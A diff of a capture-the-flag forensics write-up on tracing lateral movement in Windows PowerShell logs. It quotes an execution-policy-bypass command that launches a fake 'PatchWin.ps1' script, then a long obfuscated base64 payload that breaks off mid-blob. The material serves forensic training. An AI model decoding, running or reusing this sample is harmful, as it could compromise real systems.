@@ -2,172 +2,116 @@
 title: LateralTrace
 tags:
   - DFIR
+  - RDP
+  - RDP8bmp
 Difficulty: Hard
 ---
+### Description
 
-Checked win logs at:
+There's a lateral movement. You need to locate how the attacker connected to the second machine.
 
-C\Windows\System32\winevt\logs
+File Provided: [LateralTrace.7z](https://archive.org/download/lateral-trace.-7z/LateralTrace.7z)
+### Solution
 
-In particular, Microsoft-Windows-PowerShell%4Operational.
+I started by checking the logs located at: `C\Windows\System32\winevt\logs`
 
-There were 4104 events "Execute a Remote Command" with suspicious activity:
+In particular, `Microsoft-Windows-PowerShell%4Operational`.
 
+Within the logs there was 4104 events ("Execute a Remote Command") with suspicious activity:
+
+```
 Creating Scriptblock text (1 of 1):
 if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\john.it\Downloads\PatchWin\PatchWin.ps1'
 
 ScriptBlock ID: 52c47fad-3612-4c49-98cd-69dedad898c9
 Path: 
-
-
-Then there's an obfuscated command using 21 scriptblocks
-
-```
-Creating Scriptblock text (9 of 21):
-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aqjg4LNrrjcpb6jyyCBuqPBvri6ec93caqjjYKinonCMIiNqIOLcw7SMIiO4jCIjhYwiI5GMIiPkjCIj84wiI8GMIiPWjCIjMpMiIziTIiMNkyIjYZMiI3yTIiNTkyIjqZMiI4aTIiPqkyIjaqjg4GsslSFiqyFqqODgayyUIUViqiFqqODgayyVIWsslGkiYqshRWKqaSJqqODgqCFiqiFqqODgayyVIahpImKrIWKqaSJqqODgayyUIahpIUViqiFiqmkhaqjg4GsslSFrLJRpIqhxIGKrIUViqmkiYqpxIGqo4OBrqCFqqiFqqODgayyVIWuoaSJiqyFqqmkiaqjg4GsslCFrqGkhRWKqIWqqaSFqqODgayyVIWsslGkia6hxIGKrIUViqmkiaqpxIGqo4OCoIWuoaSdiqiFqqmknaqjg4GsslSGoaSJrqHEmYqshYqppImqqcSZqqODgayyUIahpIWuocSVFYqohYqppIWqqcSVqqODgbyyVIWsslGEiqGkga6hxJGarIUViqmEiYqppIGqqcSRqqODg0CxMIdBiLFwhaqjg4EVFLDynIyMjIyNFRUWzRUWzaqLaIwMjI1Bha6gnKW+odykra6DiA2uqYsNvqnLLa6hnKdNvqHcp22rc6muqYtNvqnLbVvdqoMM8ysfe3NxFRUUsPKcjIyMjI0Wza6LZIzMjI1GWmwMjIyMsOycpLDtnKWNrouKjIyMj3OtWz2uiyiMzIyObYyMjI2+oLylvqHcpK28s4CpvLOByK2+obykzb6h3KTtvLOBqM28s4HI7b6hvKQNvqHcpC2ug4mNvLOBqw28s4HLLb6hvKdNvqHcp29zrbyzgatNvLOBy21aJaqLLIzMjI2qi2yMzIyMsoFLc3NzToy8HI8oL3tzcRUVFRSw8pyMjIyMjRUVFs0VFRbNFs2og69XiJFcV1eIiVyhr3OqpJylq3OurItXiIVcsa6DKIUWoJylqoMshRaoi1eInVy5roMonqCcpaqDLJ6oibqjrauLKJlZlbqjrauLKIFc3a6DKK2uoJylq3OprqiJW02qgwyRupuNWLmqo4OBFLDynIyMjIyNqCOtvqPJrrjcpyu7f3NyzRUVFs0VFs2qi2iMDIyNQYWuoZynbb6h3KdNroMoDa6piO2+qcjNrqGcpK2+oNylq3OprqmIrb6oyVvZqoMM8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